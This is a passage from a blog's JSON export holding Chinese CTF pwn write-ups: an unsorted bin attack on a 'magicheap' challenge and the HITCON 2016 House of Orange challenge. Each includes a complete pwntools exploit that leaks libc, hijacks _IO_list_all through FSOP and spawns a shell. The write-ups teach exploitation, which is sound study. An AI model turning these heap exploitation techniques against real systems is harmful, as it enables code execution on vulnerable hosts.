attack</strong></p>\n<p>查壳，64位，保护几乎全开。</p>\n<p>一道菜单题，在edit函数中没有限制写入的size，存在堆溢出。133t函数是个后门函数，需要修改bss段的magic&gt;0x1305后，选择4869进入，即可get shell。</p>\n<p>原本以为是利用fast bin attack将magic所在的内存malloc出来，然后通过edit函数修改magic的值。后来发现不能malloc出来，调试的时候发现报错说指针非法。</p>\n<p>后来看到是使用<strong>unsorted bin attack</strong>，unsorted bin attack可以将一个地址的值写为一个<strong>非常大</strong>的数，可以满足题目的需求。</p>\n<p>unsorted bin attack原理：</p>\n<p>在unsorted bin中，遵循FIFO的原则，free chunk采用双向链表连接。当从unsorted bin中取出chunk时，会从unsorted bin的末尾取出，在取出的过程中会执行bk-&gt;fd=unsorted_bin(av)，通过bk找到前一个chunk，将前一个chunk的fd指向unsorted bin的头结点。</p>\n<p>如果通过一些方法（如堆溢出），可以控制取出chunk的bk指针，那么就可以将*bk+0x10的位置修改为unsorted bin头结点的地址，这个地址的值是很大的。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./magicheap2&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./magicheap2&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote()</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">magic=<span class=\"number\">0x6020A0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content of heap:&quot;</span>)</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;SuccessFul&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content of heap : &quot;</span>)</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_shell</span>():</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4869&#x27;</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\">fake_chunk=<span class=\"number\">0x60207d</span></span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;chunk0&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;chunk1&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;chunk2&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x91</span>)+p64(<span class=\"number\">0</span>)+p64(magic-<span class=\"number\">0x10</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>,payload)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;chunk1&#x27;</span>)</span><br><span class=\"line\">get_shell()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>一道unsorted bin attack的题目，利用unsorted bin attack修改值来绕过if条件</p>","more":"<p><strong>unsorted bin attack</strong></p>\n<p>查壳，64位，保护几乎全开。</p>\n<p>一道菜单题，在edit函数中没有限制写入的size，存在堆溢出。133t函数是个后门函数，需要修改bss段的magic&gt;0x1305后，选择4869进入，即可get shell。</p>\n<p>原本以为是利用fast bin attack将magic所在的内存malloc出来，然后通过edit函数修改magic的值。后来发现不能malloc出来，调试的时候发现报错说指针非法。</p>\n<p>后来看到是使用<strong>unsorted bin attack</strong>，unsorted bin attack可以将一个地址的值写为一个<strong>非常大</strong>的数，可以满足题目的需求。</p>\n<p>unsorted bin attack原理：</p>\n<p>在unsorted bin中，遵循FIFO的原则，free chunk采用双向链表连接。当从unsorted bin中取出chunk时，会从unsorted bin的末尾取出，在取出的过程中会执行bk-&gt;fd=unsorted_bin(av)，通过bk找到前一个chunk，将前一个chunk的fd指向unsorted bin的头结点。</p>\n<p>如果通过一些方法（如堆溢出），可以控制取出chunk的bk指针，那么就可以将*bk+0x10的位置修改为unsorted bin头结点的地址，这个地址的值是很大的。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./magicheap2&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./magicheap2&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote()</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">magic=<span class=\"number\">0x6020A0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content of heap:&quot;</span>)</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;SuccessFul&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content of heap : &quot;</span>)</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_shell</span>():</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4869&#x27;</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\">fake_chunk=<span class=\"number\">0x60207d</span></span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;chunk0&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;chunk1&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;chunk2&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x91</span>)+p64(<span class=\"number\">0</span>)+p64(magic-<span class=\"number\">0x10</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>,payload)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;chunk1&#x27;</span>)</span><br><span class=\"line\">get_shell()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"Houseoforange Hitcon2016","date":"2023-01-02T11:54:26.000Z","_content":"\n这题似乎是house of orange的起源，堆题经典保护全开，也是经典的菜单。\n<!-- more -->\n\n这题似乎是house of orange的起源，堆题经典保护全开，也是经典的菜单。\n\n不过只有增查改，没有删除功能，最多只能申请4个chunk，size<=0x1000。\n\n结构体house:\n\n```c\nstruct house{\n    unsigned int price;\n    int color; //56746 or 31~37\n    char* name;\n}\n```\n\n其中的price和color的0x8字节是用calloc申请的。\n\n在see house的功能中，如果color为56746，那么只会从0x202080+一个随机数处输出一段字符串，不会输出color。那一段字符串只是不同表情的橙子。\n\n```c\n  if ( *(_DWORD *)(*new_house + 4LL) == 56746 )\n  {\n    printf(\"Name of house : %s\\n\", (const char *)new_house[1]);\n    printf(\"Price of orange : %d\\n\", *(unsigned int *)*new_house);\n    v0 = rand();\n    return printf(\"\\x1B[01;38;5;214m%s\\x1B[0m\\n\", *((const char **)&unk_203080 + v0 % 8));\n  }\n```\n\nupgrade功能只能调用3次，在upgrade中没有比较两次的size，因此在输入name的时候存在堆溢出。\n\n再仔细看可以发现，在输入name的时候使用的是read，没有在末尾加上`'\\x00'`，因此有泄露信息的机会。\n\n```c\n    printf(\"Length of name :\");\n    size = get_num();                             // 没有和原来的size比较\n    if ( size > 0x1000 )\n      size = 4096;\n    printf(\"Name:\");\n    read_buf((void *)new_house[1], size);         // 存在堆溢出\n```\n\n但是程序并没有free，要free的话只能利用house of orange。\n\n里面每次的see、upgrade功能均只会对最新build的house进行操作。每次build了一个house之后，new_house就被赋值为新创建的house。\n\n这道题的总体思路：\n\n`House of Orange leak libc -> unsorted bin attack 劫持 _IO_list_all -> FSOP -> 走malloc出现错误到_IO_OVERFLOW `\n\n## leak libc\n\n因为build的功能中对name而言，并没有清除原有的信息，因此free后再malloc可以泄露bin中关于libc和heapbase的信息。我们可以通过house of orange将old top chunk释放到unsorted bin。\n\nhouse of orange关键在于要合理伪造新的top chunk size绕过检测，检测如下：\n\n```c\n  assert ((old_top == initial_top (av) && old_size == 0) ||\n          ((unsigned long) (old_size) >= MINSIZE && //old size>=MINSIZE==0x20\n           prev_inuse (old_top) && //old top chunk's prev_inuse==1 最低位为1\n           ((unsigned long) old_end & (pagesize - 1)) == 0)); \n//old_top_chunk_addr+old_size-1==n*0x1000 页地址要对齐，old top chunk后面要是新的一页\n```\n\n之后再通过malloc从中切割出新的chunk用来存放name，这个chunk最好是**large bin chunk，这样chunk中的fd和bk指针可以用来泄露libc，fd_nextsize和bk_nextsize则可以用来泄露heapbase**，一次是泄露不完的，可以修改两次分别泄露两个信息。\n\n```c\n//从old top chunk中切割出来的chunk\n0x5647bb6470d0:\t0x0000000000000000\t0x0000000000000611\n0x5647bb6470e0:\t0x6464646463636363\t0x00007f625ca78188\n0x5647bb6470f0:\t0x00005647bb6470d0\t0x00005647bb6470d0\n```\n\n而old top chunk中余下的部分就有回到了unsorted bin中。\n\n## FSOP\n\n当malloc出现错误的时候，会调用一系列函数，其调用链为：\n\n`malloc() -> malloc_printerr() -> __libc_message() -> abort() -> fflush() -> _IO_flush_all_lockp()`\n\n而`_IO_flush_all_lockp()`会从`_IO_list_all`开始遍历链表，对所有的IO_FILE逐一进行检查，如果检查通过，那么`_IO_OVERFLOW`会从虚表中调用`_IO_new_file_overflow()`。如果我们能**劫持虚表的`_IO_new_file_overflow()`**，那么就能通过malloc的异常get shell。\n\n在leak完成之后，我们得到了libcbase和heapbase，但也只剩下1次build和1次upgrade了，进行FSOP需要我们能劫持文件流，并触发对应的函数，因此在upgrade中就要构造好文件流，之后在最后一次build中触发。\n\n1次堆溢出可以让我们控制unsorted bin中的留下的free chunk。劫持文件流首先就要控制`_IO_list_all`，我们可以通过堆溢出控制unsorted bin chunk的bk指针，利用unsorted bin attack将unsorted bin头写到`_IO_list_all`中，这样`_IO_list_all`就不再指向`_IO_2_1_stderr`而是指向**unsorted bin头**。\n\n之后我本以为可以在unsorted bin处伪造`_IO_2_1_stderr`，但实际上是不行的。写入后的`_IO_list_all`直接指向**unsorted bin头，而不是unsorted bin**，因此其后面的字段是其他的bin头，而不是unsorted bin中的内容。因此不能直接伪造`_IO_2_1_stderr`，但是IO_FILE通过`_chain`字段形成链表，我们可以控制`_chain`来伪造`_IO_2_1_stdout`\n\n```c\npwndbg> p *(struct _IO_FILE_plus*)0x7f887ea5bb78\n$2 = {\n  file = {\n    _flags = -1188204592,\n    _IO_read_ptr = 0x5565b92b5700 \"\",\n    _IO_read_end = 0x5565b92b5700 \"\",\n    _IO_read_base = 0x5565b92b5700 \"\",\n    _IO_write_base = 0x7f887ea5bb88 <main_arena+104> \"\",\n    _IO_write_ptr = 0x7f887ea5bb88 <main_arena+104> \"\",\n    _IO_write_end = 0x7f887ea5bb98 <main_arena+120> \"\\210\\273\\245~\\210\\177\",\n    _IO_buf_base = 0x7f887ea5bb98 <main_arena+120> \"\\210\\273\\245~\\210\\177\",\n    _IO_buf_end = 0x7f887ea5bba8 <main_arena+136> \"\\230\\273\\245~\\210\\177\",\n    _IO_save_base = 0x7f887ea5bba8 <main_arena+136> \"\\230\\273\\245~\\210\\177\",\n    _IO_backup_base = 0x7f887ea5bbb8 <main_arena+152> \"\\250\\273\\245~\\210\\177\",\n    _IO_save_end = 0x7f887ea5bbb8 <main_arena+152> \"\\250\\273\\245~\\210\\177\",\n    _markers = 0x7f887ea5bbc8 <main_arena+168>,\n    _chain = 0x7f887ea5bbc8 <main_arena+168>,\n    _fileno = 2124790744,\n    _flags2 = 32648,\n    _old_offset = 140224217070552,\n    _cur_column = 48104,\n    _vtable_offset = -91 '\\245',\n    _shortbuf = \"~\",\n    _lock = 0x7f887ea5bbe8 <main_arena+200>,\n    _offset = 140224217070584,\n    _codecvt = 0x7f887ea5bbf8 <main_arena+216>,\n    _wide_data = 0x7f887ea5bc08 <main_arena+232>,\n    _freeres_list = 0x7f887ea5bc08 <main_arena+232>,\n    _freeres_buf = 0x7f887ea5bc18 <main_arena+248>,\n    __pad5 = 140224217070616,\n    _mode = 2124790824,\n    _unused2 = \"\\210\\177\\000\\000(\\274\\245~\\210\\177\\000\\000\\070\\274\\245~\\210\\177\\000\"\n  },\n  vtable = 0x7f887ea5bc38 <main_arena+280>\n}\n```\n\n可以看到，在`_IO_list_all`被修改后，`_chain`字段对应的是`main_arena+168`，在bin中对应的就是size为0x60的small bin，因此如果能在small bins[4]的位置放入一个chunk，那么`_chain`字段就会指向该chunk，将该chunk当作是`_IO_2_1_stdout`，我们在该chunk中伪造stdout即可。\n\n而要放入small bins[4]也不困难，我们将unsorted bin chunk的size修改为0x61，后面build时malloc的第1个chunk的大小一定是0x21，不满足条件，这个unsorted bin中的chunk一定会被放入small bins[4]中，这样通过`_chain`找到该chunk。fake file的构造如下：\n\n```py\n# construct fake _IO_2_1_stdout\nfakefile=\"/bin/sh\\x00\"+p64(0x61)+p64(0)+p64(IO_list_all-0x10) # reset bk \nfakefile+=p64(0)+p64(1) # write_base < write_ptr\nfakefile=fakefile.ljust(0xd8,'\\x00')\nfakefile+=p64(heapbase+0x700+0xf0-0x18) # vtable, make _IO_overflow_t <vtable+3*0x8>==sys_addr\nfakefile+=p64(0)*2\nfakefile+=p64(sys_addr)\n```\n\n之后就在该chunk中构造`_IO_2_1_stdout`以及vtable即可，只要偏移算对就没什么问题了。最后伪造chunk头为\"/bin/sh\\x00\"，伪造`_IO_overflow_t`为system，在对该fake file调用`_IO_new_file_overflow()`时即可调用`system(\"/bin/sh\\x00\")`get shell。\n\n最终exp:（只能打通本地，打不通buu，应该是libc不对）\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='orange'\nelf=ELF('./'+filename)\nlibc=ELF('./2.23-0ubuntu11.3_amd64/libc-2.23.so')\n# p=process('./'+filename)\np=remote('node4.buuoj.cn',27360)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\n\ndef add(size,name,price,color):\n  ru(\"Your choice : \")\n  sl('1')\n  ru(\"Length of name :\")\n  sl(str(size))\n  ru(\"Name :\")\n  s(str(name))\n  ru(\"Price of Orange:\")\n  sl(str(price))\n  ru(\"Color of Orange:\")\n  sl(str(color))\n\ndef see():\n  ru(\"Your choice : \")\n  sl('2')\n\ndef upgrade(size,name,price,color):\n  ru(\"Your choice : \")\n  sl('3')\n  ru(\"Length of name :\")\n  sl(str(size))\n  ru(\"Name:\")\n  s(str(name))\n  ru(\"Price of Orange: \")\n  sl(str(price))\n  ru(\"Color of Orange: \")\n  sl(str(color))\n\n\nadd(0x20,'aaaa',1,56746)\npayload='a'*0x20+p64(0)+p64(0x21)+p32(0xddaa)+p32(0x1)+p64(0) # padding + calloc(0x8)\npayload+=p64(0)+p64(0xf91) # top chunk size == 0xf91\nupgrade(0x50,payload,1,56746) \n# debug()\nadd(0xfc0,'aaaabbbb',1,56746) # house of orange free top chunk\n# debug()\nadd(0x600,'ccccdddd',1,56746) # cut a large bin chunk from old top chunk\n\n# leak libc and heap address by bk and fd_nextsize\nsee()\nru(\"Name of house : \")\nru(\"ccccdddd\")\nlibcbase=uu64(ru('\\n')[:-1]) -0x610 -88 -0x10 -libc.sym['__malloc_hook']\nleak(\"libcbase\",hex(libcbase))\n# debug()\nupgrade(0x10,'f'*0x10,1,56746)\nsee()\nru(\"Name of house : \")\nru('f'*0x10)\nheapbase=uu64(ru('\\n')[:-1])-0xd0\n\nleak(\"libcbase\",hex(libcbase))\nleak(\"heapbase\",hex(heapbase))\n\n# debug()\n\n# FSOP\nIO_list_all=libcbase+libc.sym['_IO_list_all']\nleak(\"IO_list_all\",hex(IO_list_all))\nsys_addr=libcbase+libc.sym['system']\n\n# debug()\n\npayload='a'*0x600+p64(0)+p64(0x21)+p64(0x0000ddaa00000001)+p64(0) # before unsorted bin\nfakefile=\"/bin/sh\\x00\"+p64(0x61)+p64(0)+p64(IO_list_all-0x10) # reset bk and construct fake _IO_2_1_stdout\n# construct fake _IO_2_1_stdout\nfakefile+=p64(0)+p64(1) # write_base < write_ptr\nfakefile=fakefile.ljust(0xd8,'\\x00')\nfakefile+=p64(heapbase+0x700+0xf0-0x18) # vtable\nfakefile+=p64(0)*2\nfakefile+=p64(sys_addr)\npayload+=fakefile\nleak(\"system\",hex(IO_list_all))\nupgrade(0x600+len(payload),payload,1,56746)\n\n# debug()\n# trigger by add\nru(\"Your choice : \")\nsl('1')\n\nitr()\n```\n\n","source":"_posts/houseoforangeHitcon2016.md","raw":"---\ntitle: Houseoforange Hitcon2016\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n- house_of_xxx\n\n---\n\n这题似乎是house of orange的起源，堆题经典保护全开，也是经典的菜单。\n<!-- more -->\n\n这题似乎是house of orange的起源，堆题经典保护全开，也是经典的菜单。\n\n不过只有增查改，没有删除功能，最多只能申请4个chunk，size<=0x1000。\n\n结构体house:\n\n```c\nstruct house{\n    unsigned int price;\n    int color; //56746 or 31~37\n    char* name;\n}\n```\n\n其中的price和color的0x8字节是用calloc申请的。\n\n在see house的功能中，如果color为56746，那么只会从0x202080+一个随机数处输出一段字符串，不会输出color。那一段字符串只是不同表情的橙子。\n\n```c\n  if ( *(_DWORD *)(*new_house + 4LL) == 56746 )\n  {\n    printf(\"Name of house : %s\\n\", (const char *)new_house[1]);\n    printf(\"Price of orange : %d\\n\", *(unsigned int *)*new_house);\n    v0 = rand();\n    return printf(\"\\x1B[01;38;5;214m%s\\x1B[0m\\n\", *((const char **)&unk_203080 + v0 % 8));\n  }\n```\n\nupgrade功能只能调用3次，在upgrade中没有比较两次的size，因此在输入name的时候存在堆溢出。\n\n再仔细看可以发现，在输入name的时候使用的是read，没有在末尾加上`'\\x00'`，因此有泄露信息的机会。\n\n```c\n    printf(\"Length of name :\");\n    size = get_num();                             // 没有和原来的size比较\n    if ( size > 0x1000 )\n      size = 4096;\n    printf(\"Name:\");\n    read_buf((void *)new_house[1], size);         // 存在堆溢出\n```\n\n但是程序并没有free，要free的话只能利用house of orange。\n\n里面每次的see、upgrade功能均只会对最新build的house进行操作。每次build了一个house之后，new_house就被赋值为新创建的house。\n\n这道题的总体思路：\n\n`House of Orange leak libc -> unsorted bin attack 劫持 _IO_list_all -> FSOP -> 走malloc出现错误到_IO_OVERFLOW `\n\n## leak libc\n\n因为build的功能中对name而言，并没有清除原有的信息，因此free后再malloc可以泄露bin中关于libc和heapbase的信息。我们可以通过house of orange将old top chunk释放到unsorted bin。\n\nhouse of orange关键在于要合理伪造新的top chunk size绕过检测，检测如下：\n\n```c\n  assert ((old_top == initial_top (av) && old_size == 0) ||\n          ((unsigned long) (old_size) >= MINSIZE && //old size>=MINSIZE==0x20\n           prev_inuse (old_top) && //old top chunk's prev_inuse==1 最低位为1\n           ((unsigned long) old_end & (pagesize - 1)) == 0)); \n//old_top_chunk_addr+old_size-1==n*0x1000 页地址要对齐，old top chunk后面要是新的一页\n```\n\n之后再通过malloc从中切割出新的chunk用来存放name，这个chunk最好是**large bin chunk，这样chunk中的fd和bk指针可以用来泄露libc，fd_nextsize和bk_nextsize则可以用来泄露heapbase**，一次是泄露不完的，可以修改两次分别泄露两个信息。\n\n```c\n//从old top chunk中切割出来的chunk\n0x5647bb6470d0:\t0x0000000000000000\t0x0000000000000611\n0x5647bb6470e0:\t0x6464646463636363\t0x00007f625ca78188\n0x5647bb6470f0:\t0x00005647bb6470d0\t0x00005647bb6470d0\n```\n\n而old top chunk中余下的部分就有回到了unsorted bin中。\n\n## FSOP\n\n当malloc出现错误的时候，会调用一系列函数，其调用链为：\n\n`malloc() -> malloc_printerr() -> __libc_message() -> abort() -> fflush() -> _IO_flush_all_lockp()`\n\n而`_IO_flush_all_lockp()`会从`_IO_list_all`开始遍历链表，对所有的IO_FILE逐一进行检查，如果检查通过，那么`_IO_OVERFLOW`会从虚表中调用`_IO_new_file_overflow()`。如果我们能**劫持虚表的`_IO_new_file_overflow()`**，那么就能通过malloc的异常get shell。\n\n在leak完成之后，我们得到了libcbase和heapbase，但也只剩下1次build和1次upgrade了，进行FSOP需要我们能劫持文件流，并触发对应的函数，因此在upgrade中就要构造好文件流，之后在最后一次build中触发。\n\n1次堆溢出可以让我们控制unsorted bin中的留下的free chunk。劫持文件流首先就要控制`_IO_list_all`，我们可以通过堆溢出控制unsorted bin chunk的bk指针，利用unsorted bin attack将unsorted bin头写到`_IO_list_all`中，这样`_IO_list_all`就不再指向`_IO_2_1_stderr`而是指向**unsorted bin头**。\n\n之后我本以为可以在unsorted bin处伪造`_IO_2_1_stderr`，但实际上是不行的。写入后的`_IO_list_all`直接指向**unsorted bin头，而不是unsorted bin**，因此其后面的字段是其他的bin头，而不是unsorted bin中的内容。因此不能直接伪造`_IO_2_1_stderr`，但是IO_FILE通过`_chain`字段形成链表，我们可以控制`_chain`来伪造`_IO_2_1_stdout`\n\n```c\npwndbg> p *(struct _IO_FILE_plus*)0x7f887ea5bb78\n$2 = {\n  file = {\n    _flags = -1188204592,\n    _IO_read_ptr = 0x5565b92b5700 \"\",\n    _IO_read_end = 0x5565b92b5700 \"\",\n    _IO_read_base = 0x5565b92b5700 \"\",\n    _IO_write_base = 0x7f887ea5bb88 <main_arena+104> \"\",\n    _IO_write_ptr = 0x7f887ea5bb88 <main_arena+104> \"\",\n    _IO_write_end = 0x7f887ea5bb98 <main_arena+120> \"\\210\\273\\245~\\210\\177\",\n    _IO_buf_base = 0x7f887ea5bb98 <main_arena+120> \"\\210\\273\\245~\\210\\177\",\n    _IO_buf_end = 0x7f887ea5bba8 <main_arena+136> \"\\230\\273\\245~\\210\\177\",\n    _IO_save_base = 0x7f887ea5bba8 <main_arena+136> \"\\230\\273\\245~\\210\\177\",\n    _IO_backup_base = 0x7f887ea5bbb8 <main_arena+152> \"\\250\\273\\245~\\210\\177\",\n    _IO_save_end = 0x7f887ea5bbb8 <main_arena+152> 